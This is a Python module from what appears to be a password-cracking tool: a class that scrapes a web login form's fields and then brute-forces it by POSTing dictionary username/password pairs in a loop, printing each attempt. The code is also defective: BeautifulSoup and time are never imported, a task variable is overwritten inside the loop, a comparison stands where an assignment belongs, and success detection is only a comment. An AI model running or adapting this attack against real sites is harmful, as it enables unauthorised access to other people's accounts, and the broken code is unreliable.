
import requests
from urllib.parse import urlencode

from modules.dictionary import Dictionary


class Post:

    def __init__(self, unit):
        self.unit = unit

    def crack(self, dictionaries):

        print('[<#########>] {0}'.format(self.unit.task))

        attrs = self.unit.task['attrs']

        request = {'method':'POST', 'url':self.unit.url}
        request.update(self.unit.complements)

        response = None
        if ('session' in attrs) and not attrs['session']:
            requester = requests
        else:
            requester = requests.Session()
            response = requester.request(method='get', url=self.unit.url)

        if 'form' not in attrs:
            return {'status':-1, 'msg':'No "form" attribute'}

        # Getting indexed form
        fields = {}
        usr_field = None
        pwd_field = None
        if 'index' in attrs['form']:
            if not response:
                response = requester.request(method='get', url=self.unit.url)
            bs = BeautifulSoup(response.text)

            form = bs.find_all('form')[attrs['form']['index']]
            inputs = form.find_all('input')

            for _input in inputs:
                attrs = _input.attrs.copy()
                if 'type' not in attrs:
                    attrs['type'] == 'text'
                try:
                    if (attrs['type'] == 'text') and not (('value' in attrs) and attrs['value']):
                        usr_field = attrs['name']

                    elif (attrs['type'] == 'password') and not (('value' in attrs) and attrs['value']):
                        pwd_field = attrs['name']

                    elif attrs['type'] == 'hidden':
                        fields[attrs['name']] = attrs['value']

                except:
                    continue

        if 'usr_field' in attrs['form']:
            usr_field = attrs['usr_field']

        if 'pwd_field' in attrs['form']:
            pwd_field = attrs['pwd_field']

        if not (usr_field and pwd_field):
            return {'status':-2, 'msg':'Incomplete form tag information'}

        # Update data fields
        if 'fields' in attrs['form']:
            fields.update(attrs['form']['fields'])

        # Start cracking
        request['data'] = fields
        for dictionary in dictionaries:
            for username, password in Dictionary(**dictionary).pairs():
                print('[http] Forcing Username: {0} - Password: {1}'.format(username, password))

                request['data'][usr_field] = username
                request['data'][pwd_field] = password

                response = requester.request(**request)

                # Detectar si se logeo o no.

                if ('update' in attrs['form']) and attrs['form']['update']:
                    pass


        time.sleep(5)

        return {'status':0}